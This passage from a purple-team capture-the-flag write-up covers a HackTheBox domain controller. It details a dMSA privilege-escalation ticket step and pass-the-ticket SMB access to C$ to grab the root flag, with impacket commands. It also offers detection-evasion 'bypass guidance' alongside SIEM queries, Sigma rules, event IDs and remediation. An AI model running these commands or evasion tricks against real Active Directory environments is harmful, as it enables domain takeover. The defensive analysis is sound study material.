**Network Artifacts:** Kerberos AS-REQ and AS-REP on port 88 through the Chisel tunnel (attacker localhost:9002). Subsequent TGS-REQ and TGS-REP exchanges on the same path. From the DC's perspective, these arrive on loopback from the tunnel endpoint.

**Disk / Memory Artifacts:** kirbi files written to disk in the Evil-WinRM working directory. The TGT and dMSA tickets remain in the session's Kerberos credential cache on the DC until they expire (default 10 hours).

**Sysmon / EDR Visibility:** Sysmon has no direct visibility into Kerberos ticket content. EDR agents monitoring LSASS memory access may flag Rubeus's ticket handling if it interacts with LSASS; modern Rubeus avoids LSASS access for ticket requests that use network-based operations.

**SIEM Correlation (Splunk SPL):**
```
index=wineventlog EventCode=4769 ServiceName=krbtgt TicketEncryptionType!=0x17
| where NOT match(AccountName, "^DC01\$")
| table _time AccountName ServiceName ClientAddress
```

**Sigma Rules:** [Rubeus Kerberos Ticket Request](https://github.com/SigmaHQ/sigma/search?q=rubeus+kerberos+ticket): detects command-line patterns associated with Rubeus including `asktgt`, `asktgs`, `/dmsa`, and `/ticket:` arguments from process create events.

**Bypass Guidance:** The `/opsec` flag on the dMSA TGS request is already applied here, which requests RC4 rather than AES to avoid the weak encryption alert. The Rubeus process creation event is the most detectable artefact; running equivalent operations via impacket's `getST` from the attacker side through the tunnel avoids leaving Rubeus on disk, but `getST` did not handle the dMSA-specific exchange correctly in testing on this box.

**Remediation:** Deploy the Windows Server 2025 cumulative update that patches the dMSA privilege escalation (build 26100.4946 or later). Until patched, configure MDI to alert on TGS requests where the requested service is `krbtgt` from a non-DC source. Monitor Security 4769 for `ServiceName=krbtgt` from user accounts.

**OpSec Rating:** Moderate. The Rubeus binary on disk is a high-confidence IOC. The Kerberos events themselves are detectable with MDI but blend into normal traffic without it.

---

## Step 11: Kerberos SMB Authentication and Root Flag (T1550.003)

With the CIFS ticket cached and the clock still synchronised, `impacket-smbclient` authenticates to the DC as `xmp$` carrying Administrator-level PAC data, granting full access to `C$`. The Kerberos authentication path (`-k -no-pass`) is used rather than NTLM, which means only the ccache file is required and no password or hash needs to be passed. The root flag is at the standard location.

The clock synchronisation window is narrow: if the system clock has drifted back more than 5 minutes from the target since the `date -s` adjustment, the ticket will be rejected. Issuing both the date adjustment and the smbclient command in rapid succession is reliable. Running the adjustment immediately before the connection and re-running it if the first attempt fails works consistently.

**Commands:**

```
sudo date -s "$(date --date='+6 hours +59 minutes +59 seconds')"
impacket-smbclient -k -no-pass eighteen.htb/xmp\$@dc01.eighteen.htb -dc-ip 127.0.0.1
```

Within the smbclient session:

```
use C$
cd Users\Administrator\Desktop\
get root.txt
exit
```

```
cat root.txt
```

**Findings:** Root flag retrieved from `C:\Users\Administrator\Desktop\root.txt`.

**Blue Team Analysis:**

**Logs Generated:** Windows Security 4624 (logon type 3, network Kerberos) for the `xmp$` SMB session. Security 4672 (`Special Logon`) due to the Administrator-level PAC granting privileged group memberships. Security 5140 (`Network Share Object Accessed`) for the `C$` access. Security 4663 (`Object Access`) for each file read if file system auditing is configured on the Desktop directory.

**Alerts Triggered:** A logon event for `xmp$` (a machine-format account name) accessing `C$` from an external IP is a high-confidence alert. No legitimate administrative workflow involves a dMSA account authenticating interactively to an SMB share on its own host from an external address. MDI will alert on the Kerberos pass-the-ticket pattern and on `C$` access by an anomalous account.

**Network Artifacts:** Kerberos-authenticated SMB session on port 445 through the Chisel tunnel (attacker localhost:9003 → DC's 445). SMB3 protocol with Kerberos GSSAPI token visible in capture.

**Disk / Memory Artifacts:** Windows event log entries as listed. The ccache file on the attacker machine. The `root.txt` file downloaded to the attacker's working directory.

**Sysmon / EDR Visibility:** Sysmon Event ID 3 for the SMB connection from the tunnel endpoint. No process creation events on the DC side beyond the SMB service handling the request.

**SIEM Correlation (Splunk SPL):**
```
index=wineventlog EventCode=4624 LogonType=3 AuthenticationPackageName=Kerberos
| search TargetUserName="*$" AND NOT TargetUserName="DC01$"
| table _time TargetUserName IpAddress WorkstationName
```

**Sigma Rules:** [Pass the Ticket SMB Access](https://github.com/SigmaHQ/sigma/search?q=pass+the+ticket+kerberos+smb): detects Kerberos-authenticated SMB sessions from unexpected account principals, particularly machine-format accounts (`$` suffix) accessing administrative shares from non-DC hosts.

**Bypass Guidance:** This access pattern is inherently anomalous because the authenticating principal is a dMSA account that should never establish interactive SMB sessions. There is no practical way to make this look like legitimate traffic without first having legitimate access to the `C$` share from an administrative account.

**Remediation:** Apply the Windows Server 2025 patch to close the dMSA privilege escalation. Enable SMB auditing with file access tracking on sensitive directories. Configure alerts for `C$` access by any account other than members of the designated administrative group.

**OpSec Rating:** Loud. The `xmp$` account accessing `C$` from an external IP via Kerberos is a combination that no legitimate workflow produces and will be caught by any SIEM with a rule watching admin share access.

---

## Detection Map

| Step | Technique | MITRE ID | Windows Event | Visibility |
|------|-----------|----------|---------------|------------|
| Recon | Network port scan | T1046 | Network IDS | Loud |
| MSSQL auth | Valid accounts: SQL | T1078.001 | 4624, MSSQL audit | Low |
| SQL impersonation | Token impersonation | T1134.001 | MSSQL audit Event 15 | Moderate |
| DB credential extraction | Data from info repos | T1213 | MSSQL audit SL | Low |
| Hash cracking | Brute force offline | T1110.002 | None (offline) | None |
| RID brute-force | Domain account discovery | T1087.002 | 4776, LSA pipe | Moderate |
| WinRM spray | Password spraying | T1110.003 | 4625, 4624 | Moderate |
| WinRM shell | Remote services WinRM | T1021.006 | 4624 type 3, 91 WinRM | Moderate |
| AD ACL enumeration | Permission group discovery | T1069.002 | 4662 (if SACL) | Low |
| dMSA creation | Create account | T1136.001 | 5137, 5136 | Detected by MDI |
| Chisel tunnel | Protocol tunneling | T1572 | 5156, Sysmon EID 3 | Loud on DC |
| Rubeus TGT/TGS | Steal/forge Kerberos tickets | T1558.001 | 4768, 4769 | Moderate with MDI |
| Pass-the-ticket SMB | Pass the ticket | T1550.003 | 4624, 4672, 5140 | Loud |

---

## Would I Get Caught

The assumed environment is a mid-to-large enterprise running Active Directory on Windows Server 2025, with Microsoft Defender for Identity deployed and forwarding to a SIEM, Sysmon v15 installed on the DC, and an active SOC with a business-hours monitoring window.

The scan and WinRM spray would generate alerts within the first hour of the engagement. Any environment with a SIEM rule watching for multi-user authentication failures from a single source on port 5985 would catch the spray within minutes of execution, and the source IP would be blocked or handed to an incident responder. On a network with egress filtering on the DC, the Chisel tunnel would fail entirely: domain controllers should not be initiating outbound WebSocket connections to internet IPs, and any organisation that has taken basic DC hardening seriously will have firewall rules preventing it.

Assuming the SIEM and egress controls were not in place, the BadSuccessor dMSA creation is the highest-confidence detection point. Microsoft updated MDI to detect the dMSA creation pattern following the Akamai disclosure in May 2025, and the Windows Server 2025 patch (build 26100.4946) closes the vulnerability. An unpatched DC without MDI might miss the 5137 object creation event if nobody is watching AD audit logs, but any organisation running Server 2025 in 2026 without applying a 2025 cumulative update is already behind on patching in a way that suggests broader security posture issues.

The final SMB access as `xmp$` against `C$` would be caught by any SIEM with even a basic admin share access rule. No legitimate process creates a dMSA authentication to its own host's C drive from an external IP. That event alone is sufficient for a P1 incident in most SOCs.

In summary: the scan and spray would be caught early in a mature environment. The tunnel, dMSA creation, and final SMB access escalate the confidence level to near-certain detection in any environment where MDI is deployed and updated, the DC has egress filtering, and admin share access is monitored. The chain survives in environments that are under-monitored or unpatched against the Server 2025 dMSA vulnerability.
